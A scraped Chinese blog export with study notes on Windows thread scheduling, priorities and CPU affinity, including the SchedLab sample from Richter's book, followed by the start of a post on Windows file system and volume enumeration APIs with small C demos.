Resuming the thread will cause it to begin executiong// at address )x0001000.ResumeThread(hThread); 这可能使远程线程访问违规从而导致远程进程被终止。 通常这些寄存器的获取和设定用于调试器。 线程的优先级在调度程序给一个可调度线程分配CPU之前，CPU可以运行一个线程大约20ms。这是优先级都相同的情况，实际上，各个线程有很多不同的优先级，这将影响调度程序如何选择下一个要运行的线程。 每个线程都会被赋予一个从0（最低）到31（最高）的优先级号码。当系统确定哪个线程分配给cpu时，它首先观察优先级为31的线程，并以循环的方式对他们进行调度。 只要优先级31的线程是可调度的，系统就绝对不会将优先级0~30的线程分配给CPU。 较高优先级的线程会抢占较低优先级线程的时间片，例如一个优先级的5线程正在执行，系统确定有一个更高优先级的线程准备运行，会立即暂停较低优先级的线程（即使他还有时间片没用完）并将cpu分配给较高优先级的线程，该线程将获得一个完整的时间片。 系统启动时会创建一个0优先级的页面清0线程（zero page thread）负责在系统空闲时将内地中所有闲置页面清零 对优先级的抽象说明微软并未公开调度算法完整描述调度程序的行为。也不允许应用程序充分利用调度程序的特性。并明确告知用户调度算法会发生变化。 微软在调度程序之上进行了一层抽象提供了一系列API，用户无法直接接触到底层的调度程序。 Windows支持6个优先级类（priority class）：idle, below normal, normal, above normal, high 和 real-time idle优先级类非常适合只在系统什么都不做的时候运行的程序。例如屏幕保护程序。 real-time 一般是执行延迟非常低的短任务-例如需要响应硬件事件。 进程一般情况不能运行在Real-time优先级类下，除非用户有Increase Scheduling Priority特权。 Win2K以上又增加了below normal和above normal 有了优先级类就可以不用关注和其他应用程序的关系了，转而关注程序里的线程。 Windows有7个相对的线程优先级：idle, lowest, below normal, normal, above normal, highest 和 time-critical。这些是相对于进程优先级而言。 大多数线程使用normal线程优先级。 相对线程优先级 也就是进程都属于某个优先级类，另外可以指定进程中线程的相对优先级。 Vista系统上的进程优先级和相对线程优先级与优先级值的映射。 优先级0 预留给页面清零线程了，系统不允许其他任何线程的优先级为0. 还有一些优先级应用程序也无法获得，17~30.预留给内核模式的设备驱动程序。用户模式的应用程序是不能获得这些优先级的。 Real-time优先级类的进程的线程的优先级不能低于16， 非Real-time进程的线程优先级也不可高于15. 有些人常常搞不清进程优先级类的概念。他们认为这可能意味着进程是可以调度的。但是进程是根本不能调度的，只有线程才能被调度。进程优先级类是个抽象概念，M i c r o s o f t提出这个概念的目的，是为了帮助你将它与调度程序的内部运行情况区分开来。它没有其他目的。注意 一般来说，大多数时候高优先级的线程不应该处于可调度状态。当线程要进行某种操作时，它能迅速获得C P U时间。这时线程应该尽可能少地执行 C P U指令，并返回睡眠状态，等待再次变成可调度状态。相反，低优先级的线程可以保持可调度状态，执行大量的C P U指令来进行它的操作。如果按照这些原则来办，整个操作系统就能正确地对用户作出响应。 程序优先级当调用CreateProcess时，可以在fdwCreate参数中传递需要的优先级类。 父进程可以替想要创建的子进程选择其优先级类。子进程被创建以后可以通SetPriorityClass来修改自己的优先级类。 1234567WINBASEAPIBOOLWINAPISetPriorityClass( _In_ HANDLE hProcess, _In_ DWORD dwPriorityClass ); 例如修改当前线程所属的进程的优先级类为idle 1SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS); 命令行默认启动的进程为Normal优先级。可以使用Start命令设定启动优先级 1C:\\&gt;START /LOW CALC.EXE 还可以设定/BELOWNORMAL, /NORMAL, /ABOVENORMAL, /HIGH /REALTIME也可以通过任务管理器修改进程的优先级类 CreateThread创建的线程初始线程优先级为Normal， 。使用以下函数可以改变线程相对优先级 1234567WINBASEAPIBOOLWINAPISetThreadPriority( _In_ HANDLE hThread, _In_ int nPriority ); nPriority参数如下表: 获取线程优先级 123456WINBASEAPIintWINAPIGetThreadPriority( _In_ HANDLE hThread ); 例如创建一个线程优先级为idle的线程。 123456DWORD dwThreadID;HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, CREATE_SUSPENDED, &amp;dwThreadID);SetThreadPriority(hThread, THREAD_PRIORITY_IDLE);ResumeThread(hThread);CloseHandle(hThread); 创建线程时设置为CREATE_SUSPENDED先将其挂起然后设置线程优先级为THREAD_PRIORITY_IDLE ResumeThread恢复线程运行 关闭线程的内核对象句柄 注意：微软并未提供返回线程优先级的函数（0~31数值）。因为微软保留线程调度算法随时可能改变的权利。 动态提高线程的优先级等级系统通过线程的“”相对优先级“”和线程所属进程的“”优先级类“”来确定其优先级值（基本优先级值 base priority level）。 偶尔系统也会提升一个线程的优先级值-为了响应某种IO或窗口消息或磁盘读取。 书上讲了一个例子，例如一个基础优先级13的线程收到WM_KEYDOWN后被体统提升为15，处理完一个时间片以后，递减至14，最后到13保持不变。 也就是线程的当前优先级不会低于其基本优先级。但是微软没公开设备驱动能将线程优先级动态提升多少。系统只能提升优先级在（115 ，不会高于15）系统不会动态提高范围（1631）的线程。可以禁止系统动态提升线程优先级 1234567WINBASEAPIBOOLWINAPISetProcessPriorityBoost( _In_ HANDLE hProcess, _In_ BOOL bDisablePriorityBoost ); 禁止或开启系统对一个进程中的所有线程动态提升优先级 1234567WINBASEAPIBOOLWINAPISetThreadPriorityBoost( _In_ HANDLE hThread, _In_ BOOL bDisablePriorityBoost ); 禁止或开启系统对一个线程的动态提升优先级 还可以获取当前是否已经开启了动态提升优先级功能。 123456789101112131415WINBASEAPIBOOLWINAPIGetProcessPriorityBoost( _In_ HANDLE hProcess, _Out_ PBOOL pDisablePriorityBoost ); WINBASEAPIBOOLWINAPIGetThreadPriorityBoost( _In_ HANDLE hThread, _Out_ PBOOL pDisablePriorityBoost ); 还有一种情况系统也会动态提升线程的优先级。例如一个优先级为4的线程，但又有一个优先级为8的线程一直处于调度状态。因此4优先级的线程无法被调度，在这种情况下优先级为4的线程处于CPU时间饥饿状态。当系统检测到线程已经处于饥饿状态3-4秒，它会动态将饥饿状态的优先级提升为15，并允许线程运行两个时间片。当两个时间片结束，线程会立即回复到基本优先级。 为前台进程调整调度算法用户需要使用某个进程窗口（称为前台进程foreground process） 而所有其他的进程成为后台进程（background process）。 前台进程处于Normal优先级下，windows会微调前台进程的调度算法。系统给前台进程的线程分配比一般情况下更多的时间片。 系统属性-&gt;高级-&gt;性能计划 中可以进行微调 调度I/O请求优先级低优先级进程可以在一个时间片写入成百上千的IO请求入入列。会显著的影响高优先级线程的性能。（例如后台磁盘碎片整理，病毒扫描，内容索引程序） windows VISTA开始线程可以在进行I/O请求时设置优先级了。 设置SetThreadPriority 并传入 THREAD_MODE_BACKGROUND_BEGIN来设置其IO请求优先级。这里是低优先级IO请求，同时会降低其CPU调度优先级 也可以恢复THREAD_MODE_BACKGROUND_END 默认的优先级IO请求，恢复normal cpu调度优先级。 这里的hThread必须是GeCurrentThread 也就是当前线程自己才可以修改其IO优先级。不允许修改另一个线程的IO优先级。 如果要让进程中所有线程都是用低IO请求和低CPU调度。可以使用 SetPriorityClass 并传入 PROCESS_MODE_BACKGROUND_BEGIN 同时降低当前进程所有线程的IO请求优先级和cpu调度优先级。 相反传入PROCESS_MODE_BACKGROUND_END 表示恢复默认IO请求优先级和cpu调度优先级。 这里的进程句柄只能是当前进程自己GetCurrentProcess（）不可以修改别的进程的IO优先级。 在更细的粒度上normal优先级线程还可以执行对某个文件执行后台优先级I/O,例如 1234FILE_IO_PRIORITY_HINT_INFO phi;phi.PriorityHint = IoPriorityHintLow;SetFileInformationByHandle( hFile, FileIoPriorityHintInfo, &amp;phi, sizeof(FILE_IO_PRIORITY_HINT_INFO)); SetFileInformationByHandle设置的优先级将覆盖SetPriorityClass或者SetThreadPriority设置的优先级。应该尽量避免优先级逆转。 优先级倒置，又称优先级反转、优先级逆转、优先级翻转，是一种不希望发生的任务调度状态。在该种状态下，一个高优先级任务间接被一个低优先级任务所抢先(preemtped)，使得两个任务的相对优先级被倒置。这往往出现在一个高优先级任务等待访问一个被低优先级任务正在使用的临界资源，从而阻塞了高优先级任务；同时，该低优先级任务被一个次高优先级的任务所抢先，从而无法及时地释放该临界资源。这种情况下，该次高优先级任务获得执行权 Scheduling Lab实例应用程序 笔者开了一个实例发现cpu使用率在25%稳定 开了4个实例cpu使用率实际只有66% 并不能使用完全部4核CPU的资源（笔者用的是4核心的i5-3470 CPU） 再开了8个实例以后CPU的使用率达到了70%~84% 还是不能使用完全部的CPU资源，并且系统并无明显的卡顿感 将8个实例全部开到Priority Class High Thread relative priority：Time Critical 还是依旧无卡顿感。。。 Win7系统的多线程用户体验优化还是可以的。 发现及时改成Priority Class IDLE Thread relative priority: IDLE 数字的更新依旧非常连贯。 Win7修改了调度策略？？？ 唯一影响更新时间的就是Sleep。 这个一修改明显感觉更新变慢了。而且在sleep值4位以后对EditBox的修改响应也明显变慢。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218/******************************************************************************Module: SchedLab.cppNotices: Copyright (c) 2008 Jeffrey Richter &amp; Christophe Nasarre******************************************************************************/#include &quot;..\\CommonFiles\\CmnHdr.h&quot; /* See Appendix A. */#include &lt;windowsx.h&gt;#include &lt;tchar.h&gt;#include &quot;Resource.h&quot;#include &lt;StrSafe.h&gt;///////////////////////////////////////////////////////////////////////////////DWORD WINAPI ThreadFunc(PVOID pvParam) { HANDLE hThreadPrimary = (HANDLE) pvParam; SuspendThread(hThreadPrimary); chMB( &quot;The Primary thread is suspended.\\n&quot; &quot;It no longer responds to input and produces no output.\\n&quot; &quot;Press OK to resume the primary thread &amp; exit this secondary thread.\\n&quot;); ResumeThread(hThreadPrimary); CloseHandle(hThreadPrimary); // To avoid deadlock, call EnableWindow after ResumeThread. EnableWindow( GetDlgItem(FindWindow(NULL, TEXT(&quot;Scheduling Lab&quot;)), IDC_SUSPEND), TRUE); return(0);}///////////////////////////////////////////////////////////////////////////////BOOL Dlg_OnInitDialog (HWND hWnd, HWND hWndFocus, LPARAM lParam) { chSETDLGICONS(hWnd, IDI_SCHEDLAB); // Initialize process priority classes HWND hWndCtl = GetDlgItem(hWnd, IDC_PROCESSPRIORITYCLASS); int n = ComboBox_AddString(hWndCtl, TEXT(&quot;High&quot;)); ComboBox_SetItemData(hWndCtl, n, HIGH_PRIORITY_CLASS); // Save our current priority class DWORD dwpc = GetPriorityClass(GetCurrentProcess()); if (SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS)) { // This system supports the BELOW_NORMAL_PRIORITY_CLASS class // Restore our original priority class SetPriorityClass(GetCurrentProcess(), dwpc); // Add the Above Normal priority class n = ComboBox_AddString(hWndCtl, TEXT(&quot;Above normal&quot;)); ComboBox_SetItemData(hWndCtl, n, ABOVE_NORMAL_PRIORITY_CLASS); dwpc = 0; // Remember that this system supports below normal } int nNormal = n = ComboBox_AddString(hWndCtl, TEXT(&quot;Normal&quot;)); ComboBox_SetItemData(hWndCtl, n, NORMAL_PRIORITY_CLASS); if (dwpc == 0) { // This system supports the BELOW_NORMAL_PRIORITY_CLASS class // Add the Below Normal priority class n = ComboBox_AddString(hWndCtl, TEXT(&quot;Below normal&quot;)); ComboBox_SetItemData(hWndCtl, n, BELOW_NORMAL_PRIORITY_CLASS); } n = ComboBox_AddString(hWndCtl, TEXT(&quot;Idle&quot;)); ComboBox_SetItemData(hWndCtl, n, IDLE_PRIORITY_CLASS); ComboBox_SetCurSel(hWndCtl, nNormal); // Initialize thread relative priorities hWndCtl = GetDlgItem(hWnd, IDC_THREADRELATIVEPRIORITY); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Time critical&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_TIME_CRITICAL); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Highest&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_HIGHEST); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Above normal&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_ABOVE_NORMAL); nNormal = n = ComboBox_AddString(hWndCtl, TEXT(&quot;Normal&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_NORMAL); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Below normal&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_BELOW_NORMAL); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Lowest&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_LOWEST); n = ComboBox_AddString(hWndCtl, TEXT(&quot;Idle&quot;)); ComboBox_SetItemData(hWndCtl, n, THREAD_PRIORITY_IDLE); ComboBox_SetCurSel(hWndCtl, nNormal); Edit_LimitText(GetDlgItem(hWnd, IDC_SLEEPTIME), 4); // Maximum of 9999 return(TRUE);}///////////////////////////////////////////////////////////////////////////////void Dlg_OnCommand (HWND hWnd, int id, HWND hWndCtl, UINT codeNotify) { switch (id) { case IDCANCEL: PostQuitMessage(0); break; case IDC_PROCESSPRIORITYCLASS: if (codeNotify == CBN_SELCHANGE) { SetPriorityClass(GetCurrentProcess(), (DWORD) ComboBox_GetItemData(hWndCtl, ComboBox_GetCurSel(hWndCtl))); } break; case IDC_THREADRELATIVEPRIORITY: if (codeNotify == CBN_SELCHANGE) { SetThreadPriority(GetCurrentThread(), (DWORD) ComboBox_GetItemData(hWndCtl, ComboBox_GetCurSel(hWndCtl))); } break; case IDC_SUSPEND: // To avoid deadlock, call EnableWindow before creating // the thread that calls SuspendThread. EnableWindow(hWndCtl, FALSE); HANDLE hThreadPrimary; DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(), &amp;hThreadPrimary, THREAD_SUSPEND_RESUME, FALSE, DUPLICATE_SAME_ACCESS); DWORD dwThreadID; CloseHandle(chBEGINTHREADEX(NULL, 0, ThreadFunc, hThreadPrimary, 0, &amp;dwThreadID)); break; }}///////////////////////////////////////////////////////////////////////////////INT_PTR WINAPI Dlg_Proc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) { switch (uMsg) { chHANDLE_DLGMSG(hWnd, WM_INITDIALOG, Dlg_OnInitDialog); chHANDLE_DLGMSG(hWnd, WM_COMMAND, Dlg_OnCommand); } return(FALSE);}///////////////////////////////////////////////////////////////////////////////int WINAPI _tWinMain(HINSTANCE hInstExe, HINSTANCE, PTSTR pszCmdLine, int) { HWND hWnd = CreateDialog(hInstExe, MAKEINTRESOURCE(IDD_SCHEDLAB), NULL, Dlg_Proc); BOOL fQuit = FALSE; while (!fQuit) { MSG msg; if (PeekMessage(&amp;msg, NULL, 0, 0, PM_REMOVE)) { // IsDialogMessage allows keyboard navigation to work properly. if (!IsDialogMessage(hWnd, &amp;msg)) { if (msg.message == WM_QUIT) { fQuit = TRUE; // For WM_QUIT, terminate the loop. } else { // Not a WM_QUIT message. Translate it and dispatch it. TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); } } // if (!IsDialogMessage()) } else { // Add a number to the listbox static int s_n = -1; TCHAR sz[20]; StringCchPrintf(sz, _countof(sz), TEXT(&quot;%u&quot;), ++s_n); HWND hWndWork = GetDlgItem(hWnd, IDC_WORK); ListBox_SetCurSel(hWndWork, ListBox_AddString(hWndWork, sz)); // Remove some strings if there are too many entries while (ListBox_GetCount(hWndWork) &gt; 100) ListBox_DeleteString(hWndWork, 0); // How long should the thread sleep int nSleep = GetDlgItemInt(hWnd, IDC_SLEEPTIME, NULL, FALSE); if (chINRANGE(1, nSleep, 9999)) Sleep(nSleep); } } DestroyWindow(hWnd); return(0);}//////////////////////////////// End of File ////////////////////////////////// 亲缘性默认情况下系统使用软关联（soft affinity）来给线程分配处理器： 如果其他因素都一样。系统将使线程在上一次运行的处理器上运行。让线程始终在同一个处理器上运行有助于重用仍在处理器高速缓存中的数据。NUMA（Uon-Uniform Memory Access， 非统一内存访问）计算机体系结构，系统有多快系统板组成，每块系统板有自己的多个cpu和内存。如下图———————————————— NUMA在cpu只访问其所在主板上的内存时性能最佳，若访问其他主板上的内存性能下降的很厉害。因此希望cpu将同一进程的所有线程尽量运行在同一块主板的内存和cpu上。 这就需要设置进程和线程的关联性（affinity）。可以设置让哪些CPU运行特定的线程。（硬关联） 调用GetSystemInfo可以查询机器上cpu的数量。 SetProcessAffinityMask 用以限制某些线程只能在可用cpu的一个子集上运行。 123456BOOLWINAPISetProcessAffinityMask( _In_ HANDLE hProcess, _In_ DWORD_PTR dwProcessAffinityMask ); 第一个参数代表要设置的进程，第二个参数dwProcessAffinityMask设置以为掩码，代表线程可以在哪些CPU上运行。例如0x00000005 代表进程中的线程可以在CPU0 和CPU2上运行，但是不能在CPU1和CPU3-31上运行。 子进程将继承关联性。如果一个进程的关联性掩码为0x00000005 它的所有子进程中的任何线程也将具有相同的掩码。还可以使用作业对象来限制一组进程只在一组CPU上运行。 JOBOBJECT_BASIC_LIMIT_INFORMATION 的 Affinity成员可以设置此作业上进程的掩码 获取进程的关联性掩码 12345678WINBASEAPIBOOLWINAPIGetProcessAffinityMask( _In_ HANDLE hProcess, _Out_ PDWORD_PTR lpProcessAffinityMask, _Out_ PDWORD_PTR lpSystemAffinityMask ); 第一个参数是进程的句柄。 第二个参数获取进程的关联性掩码 第三个参数返回系统的关联性掩码（如果存在）表示系统中哪个CPU可以运行这些线程。 设置线程的关联性掩码 SetThreadAffinityMask 1234567WINBASEAPIDWORD_PTRWINAPISetThreadAffinityMask( _In_ HANDLE hThread, _In_ DWORD_PTR dwThreadAffinityMask ); 该掩码必须是其进程关联性掩码的真子集。 返回值是线程之前的关联性掩码。 例如要限制3个线程只运行在CPU1， CPU2和CPU3上。可以这样 x86系统启动是，系统将执行代码，检查主机上哪个PCU存在注明的Pentium FDIV bug。方法是将一个线程关联性设置为该CPU，执行可能会出错的除法操作，然后比较结构是否与已知正确的结构相符。随后再采取同样步骤检查下一个CPU。 书上给出的例子说明了cpu关联性将影响线程的调度和性能。 当线程A被唤醒时，调度程序发现该线程可以在 CPU 0上运行，因此它被分配给CPU 0。然后线程B被唤醒，调度程序发现该线程可以被分配给 CPU 0或1，但是，由于CPU 0正在使用之中，因此调度程序将线程B分配给了CPU 1。至此，一切进行得都很顺利。这时线程C被唤醒，调度程序发现它只能在CPU 1上运行。但是CPU 1正在被线程B使用着，它是个优先级为8的线程。由于线程C的优先级为6，因此它不能抢在线程B的前面运行。线程C可以抢在线程A的前面运行，因为线程A的优先级是4，但是调度程序不会使它抢在线程A的前面运行，因为线程C不能在CPU 0上运行。这显示出为线程设置硬亲缘性将会对调度程序的优先级设置方案产生什么样的影响。 有时候强制一个线程只能使用特定的某个cpu并不是什么好主意。可能出现3个线程同时抢占cpu0，而cpu 1,2,3却无所事事。 SetThreadIdealProcessor 给线程设置一个理想的CPU，但若有CPU空闲也可以将它移到另一个CPU上。 1234567WINBASEAPIDWORDWINAPISetThreadIdealProcessor( _In_ HANDLE hThread, _In_ DWORD dwIdealProcessor ); dwIdealProcessor不是掩码，而是0~31/63之间的整数。 可以传入 MAXIMUM_PROCESSOR表示没有线程理想的CPU。函数返回之前理想的CPU。如果线程没有理想CPU则为MAXIMUM_PROCESSORS 可以在可执行文件的头部设置处理器关联性。（虽然连接器并没有提供类似的功能）利用了ImageHlp.h中声明的一些函数 123456789101112131415// Load the EXE into memory.PLOADED_IMAGE pLoadedImage = ImageLoad(szExeName, NULL); // Get the current load configuration information for the EXE.IMAGE_LOAD_CONFIG_DIRECTORY ilcd;GetImageConfigInformation(pLoadedImage, &amp;ilcd); // Change the processor affinity mask.ilcd.ProcessAffinityMask = 0x00000003; // I desire CPUs 0 and 1 // Save the new load configuration information.SetImageConfigInformation(pLoadedImage, &amp;ilcd); // Unload the EXE from memoryImageUnload(pLoadedImage);","link":"/2019/08/30/Windows-Kernel-7/"},{"title":"Windows应用程序-文件系统","text":"文件系统是操作系统的重要组成部分。支持操作系统运行的系统可执行文件本身也位于文件系统中。几乎所有的应用程序都要靠操作文件，文件系统应用程序开发接口是系统提供的最重要、最基本的API集合之一，也是Windows开发应用程序最常用到的接口 概括从Windows诞生到现在，文件系统也在不停的升级，从最早的FAT16到FAT32再到现在的NTFS文件系统。 要熟练使用文件系统API必须先了解Windows文件系统中的一些基本概念。这些概念包括”驱动器”、”卷”、”目录”、”文件对象”、”文件流”、”文件句柄”、”文件指针”、”文件映射”等。 文件系统基本概念磁盘分区磁盘是装载计算机上的存储设备，比如常见的硬盘。一个物理硬盘上可以划分可以独自工作的一些逻辑磁盘。 卷卷，也被称为逻辑驱动器，是NTFS、FAT32文件系统组织结构的最高层。卷是存储设备上由文件系统管理的一块区域，是在逻辑上相互隔离的存储单元。 Windows系统中文件命名的标准Windows系统中，文件格式命名以”主文件名+扩展名”，中间以.隔开。 长度规则Windows系统中，不对单个文件的长度作限制，但是文件路径的长度被限制在了260个字符。 特殊字符不允许出现特殊字符，特殊字符在系统或者命令行下代表一些特殊的含义。 文件系统主要APIGetLogicalDrives获取主机中所有逻辑驱动器,以 Bit Map 的形式返回 GetLogicalDrivesStrings获取主机中所有逻辑驱动器,以驱动器根路径字符串返回 FindFirstVolume查找主机中的第一个驱动器,返回查找句柄 FindNextVolume根据FindFirstVolume返回的句柄,查找主机中后续的逻辑驱动器 FindVolumeClose关闭驱动器查找句柄 GetDriveType获取驱动器类型 GetVolumeInformation获取逻辑驱动器信息 FindFirstVolumeMountPoint查找指定卷的第一个挂载点,返回查找句柄 FindNextVolumeMountPoint根据FindFirstVolumeMountPoint返回的句柄,查找卷的后续挂载点 FindVolumeMountPointClose关闭挂载点查找句柄 GetVolumeNameForVolumeMountPoint根据指定挂载点获取相应的卷设备名 SetVolumeMountPoint将指定卷挂载到指定挂载点 GetDiskFreeSpace获取磁盘空间信息,包括每簇的扇区数,每扇区的字节数,簇数量,空闲的簇数量 GetDiskFreeSpaceEx获取用户可用的空闲空间的字节数,磁盘总容量的字节数 文件和目录管理 API说明 DeleteFile才删除参数所指定文件 CopyFile复制指定文件为一个新文件 MoveFile将指定文件或目录移动到指定位置 CreateFile新建或打开一个文件,获取文件句柄 ReadFile读取由文件句柄指定的文件的内容 WriteFile向由文件句柄指定的文件中写入内容 GetFileSize获取文件大小,返回DWORD,大小超过DWORD最大值时可指定高32位DWORD联合存储 GetFileSizeEx获取文件大小,存储到一个64位的大整数联合体中 CreateDirectory创建一个目录 GetCurrentDirectory获取当前程序所在目录 SetCurrentDirectory设置当前程序所在目录 GetModuleFileName获取当前模块全路径 FindFirstFile查找指定目录下第一个文件或目录,获得查找句柄 FindNextFile根据FindFirstFile获得的句柄,循环查找文件和目录 GetFileAttributes获取指定文件或目录的属性,返回DWORD GetFileAttributesEx获取指定文件或目录属性,存储在WIN32_FILE_ATTRIBUTE_DATA结构体中 SetFileAttributes将文件属性设置为指定值 FileTimeToLocalFileTime将文件时间转换为本地时间 FileTimeToSystemTime将文件时间转换为系统时间,SYSTEMTIME格式,便于显示 高级文件系统操作 API说明 CreateFileMapping创建文件映射对象 MapViewOfFile创建视图,将创建的文件映射对象映射到当前进程的地址空间中 FlushViewOfFile将视图中数据写入磁盘,对视图的操作都会反映到磁盘上的文件中 OpenFileMapping打开已经存在的命名的文件映射对象 UnmapViewOfFile取消文件映射 GetMappedFileName从映射对象获取被映射文件的文件设备名 QueryDosDevice获取MS-DOS设备名 键盘和驱动器管理Windows API是提供给用户态程序使用的。一些对磁盘的高级操作，如磁盘分区、格式化驱动器、改变驱动器的文件系统、读取磁盘扇区等操作需要在内核态完成。 便利卷并获取属性获取主机上的所有驱动器列表的方法有两种，一种是使用GetLogicalDrives或GetLogicalDriveStrings，另一种方式是使用FindFirstVolume和FindNextVolume组成。 第一种方法获取主机上逻辑驱动器，也就是所有分配的卷标和驱动器，返回结果是驱动器的根路径。第二种方法返回的是”\\?\\Volume{GUID}”形式的启动器设备名 使用GetDriveTypeAPI可以获取驱动器的类型，使用GetVolumeInfomation可以获取驱动器属性。 关键APIGetLogicalDrives获取主机中所有逻辑驱动器，以BitMap的形式返回，函数原型如下： 1DWORD GetLogicalDrives(void); GetLogicalDrives函数返回一个DWORD类型的值，第一位表示所对应驱动器是否存在。一般情况下DWORD的数据长度是32位，再这个DWORD中，每一位对应了一个逻辑驱动器是否存在。 GetLogicalDrivesStrings获取主机中所有的逻辑驱动器，以启动器根路径字符串返回，函数原型如下： 1234DWORD GetLogicalDrivesStrings( DWORD nBufferLength, //所指向的内存空间的大小，字节单位 LPTSTR lpBuffer //指向存储返回结果字符串的内存大小); 写一个Demo： 1234567891011121314151617181920212223242526#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define BUFSIZE 1024int main(){ CHAR szLogicalDriveStrings[BUFSIZE]; ZeroMemory(szLogicalDriveStrings, BUFSIZE);//这也是一个API函数， 清空这个字符串 GetLogicalDriveStrings(BUFSIZE - 1, szLogicalDriveStrings); //printf(&quot;%s\\n&quot;, szLogicalDriveStrings); PCHAR psz; psz = (PCHAR)szLogicalDriveStrings; do{ printf(&quot;%s\\n&quot;, psz); psz += (strlen(psz) + 1); } while ((*psz) != '\\0'); system(&quot;pause&quot;);} FindFirstVolume查找主机中的第一个驱动器，返回驱动器设备名，函数原型如下： 1234HANDLE FindFirstVolume( LPTSTR lpszVolumeName, //驱动名的缓冲区大小 DWORD cchBufferLength //指向驱动名函数的大小，以字节为单位); 驱动器查找句柄，可作为FindNextVolume和FindVolumeClose的参数，如果执行失败，返回NULL 一个小Demo： 12345678910111213141516171819202122#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;void main(){ CHAR szVolume[MAX_PATH] = { 0 }; HANDLE hVolume = FindFirstVolumeA(szVolume, MAX_PATH); if (INVALID_HANDLE_VALUE == hVolume) return 0; //string strVolume = szVolume; printf(&quot;%s \\n&quot;, szVolume); while (FindNextVolumeA(hVolume, szVolume, MAX_PATH)) { printf(&quot;%s \\n&quot;, szVolume); } FindVolumeClose(hVolume);//别忘了关闭句柄 system(&quot;pause&quot;);} FindNextVolume查找主机中后续的逻辑驱动器，其函数原型如下： 12345BOOL WINAPI FindNextVolume( _In_ HANDLE hFindVolume, //FindFirstVolume返回的驱动器查找句柄 _Out_ LPTSTR lpszVolumeName, //指向保存驱动器名的内存缓冲区 _In_ DWORD cchBufferLength //指向LpszVolumeName所指向的驱动的大小，字节单位 ); 返回BOOL表示是否成功，如果失败说明已经查找完毕所有的逻辑驱动器 FindVolumeClose关闭FindVolumeClose打开的卷遍历句柄，函数原型如下： 123BOOL WINAPI FindVolumeClose( HANDLE hFileVolume //要关闭的驱动器的查找句柄) 返回BOOL值表示是否成功关闭句柄 GetDriveType获取驱动器类型，函数原型如下： 123UINT GetDriveType( LPCTSTR lpRootPathName //驱动器根目录，如&quot;c:\\&quot;); 驱动器类型，如果DEIVE_FIXED表示硬盘，DEIVE_CDROM表示光盘 GetVolumeInformation获取逻辑驱动器信息，函数原型如下： 12345678910BOOL GetVolumeInformation( lpRootPathName: PChar; {磁盘驱动器代码字符串} lpVolumeNameBuffer: PChar; {磁盘驱动器卷标名称} nVolumeNameSize: DWORD; {磁盘驱动器卷标名称长度} lpVolumeSerialNumber: PDWORD; {磁盘驱动器卷标序列号} var lpMaximumComponentLength: DWORD; {系统允许的最大文件名长度} var lpFileSystemFlags: DWORD; {文件系统标识} lpFileSystemNameBuffer: PChar; {文件操作系统名称} nFileSystemNameSize: DWORD {文件操作系统名称长度}); 返回BOOL，表示信息是否获取成功。 Demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123/* 头文件 */#include &lt;windows.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;/* 预定义 */#define BUFSIZE 1024/* 函数申明 */BOOL GetDirverInfo(LPSTR szDrive);/* ************************************* 功能 应用程序主函数，遍历驱动器并调用* GetDirverInfo 获取驱动器属性**************************************/void main(void){ CHAR szLogicalDriveStrings[BUFSIZE]; PCHAR szDrive; ZeroMemory(szLogicalDriveStrings, BUFSIZE); // 获取逻辑驱动器卷标名 GetLogicalDriveStrings(BUFSIZE - 1, szLogicalDriveStrings); szDrive = (PCHAR)szLogicalDriveStrings; // 循环处理每个卷 do { if (!GetDirverInfo(szDrive)) { printf(&quot;\\nGet Volume Information Error: %d&quot;, GetLastError()); } szDrive += (lstrlen(szDrive) + 1); } while (*szDrive != '\\x00');}/* ************************************* BOOL GetDirverInfo(LPSTR szDrive)* 功能 获取驱动器的属性* 参数 LPSTR szDrive* 指明要获取属性的驱动器的根路径 如 C:\\* 返回值 BOOL 是否成功**************************************/BOOL GetDirverInfo(LPSTR szDrive){ UINT uDriveType; DWORD dwVolumeSerialNumber; DWORD dwMaximumComponentLength; DWORD dwFileSystemFlags; TCHAR szFileSystemNameBuffer[BUFSIZE]; printf(&quot;\\n%s\\n&quot;, szDrive); uDriveType = GetDriveType(szDrive); // 判断类型 switch (uDriveType) { case DRIVE_UNKNOWN: printf(&quot;The drive type cannot be determined. &quot;); break; case DRIVE_NO_ROOT_DIR: printf(&quot;The root path is invalid, for example, no volume is mounted at the path. &quot;); break; case DRIVE_REMOVABLE: printf(&quot;The drive is a type that has removable media, for example, a floppy drive or removable hard disk. &quot;); break; case DRIVE_FIXED: printf(&quot;The drive is a type that cannot be removed, for example, a fixed hard drive. &quot;); break; case DRIVE_REMOTE: printf(&quot;The drive is a remote (network) drive. &quot;); break; case DRIVE_CDROM: printf(&quot;The drive is a CD-ROM drive. &quot;); break; case DRIVE_RAMDISK: printf(&quot;The drive is a RAM disk. &quot;); break; default: break; } if (!GetVolumeInformation( szDrive, NULL, 